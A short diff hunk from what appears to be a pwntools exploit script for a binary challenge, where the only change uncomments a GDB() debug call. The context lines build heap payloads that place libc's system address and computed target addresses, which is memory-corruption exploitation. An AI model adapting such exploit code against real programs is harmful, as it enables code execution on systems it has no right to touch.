@@ -114,7 +114,7 @@ queue_list = [b"\0\0\0\0", (p64(libc.sym.system) * 3).ljust(0xff0, b"\0"), b"\0"
 new2.run(proces)
 target = lor - 4145
 place = lor -151584
-# GDB()
+GDB()
 queue_list = [b"\0\0\0\0", b"".ljust(0x12,b"\0") + p64(0)*2 + p64(target) + p64(libc.address + 0x1cb42f) + p64(place)*2, b"\0"*0xd]
 new2.run(proces)
 new2.run(proces)
